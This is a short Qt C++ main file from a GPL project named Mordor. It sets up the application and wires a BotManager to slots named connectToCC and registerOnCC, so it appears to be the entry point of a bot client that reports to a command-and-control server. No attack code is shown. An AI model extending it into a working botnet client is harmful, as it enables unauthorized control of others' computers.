/**
 *  This file is part of Mordor.
 *
 *  Copyright (c) 2016 Juan Jose Salazar Garcia jjslzgc@gmail.com
 *
 *  Mordor is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  Mordor is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with Mordor.  If not, see <http://www.gnu.org/licenses/>.
 *
 **/

#include <QCoreApplication>
#include "botmanager.h"
#include "global.h"

void setupApplication(QCoreApplication *app);

int main(int argc, char *argv[])
{
    QCoreApplication app(argc, argv);

    setupApplication(&app);

    BotManager *manager = BotManager::instance();

    QObject::connect(manager, SIGNAL(ready()), manager, SLOT(connectToCC()));
    QObject::connect(manager, SIGNAL(unregistered()), manager, SLOT(registerOnCC()));
    QObject::connect(manager, SIGNAL(serverListNotFound()), &app, SLOT(quit()));

    return app.exec();
}

void setupApplication(QCoreApplication *app)
{
    if(!app)
        return;

    app -> setOrganizationName(ORGANIZATION_NAME);
    app -> setOrganizationDomain(ORGANIZATION_DOMAIN);
    app -> setApplicationName(APPLICATION_NAME);
    app -> setApplicationVersion(APPLICATION_VERSION);
}
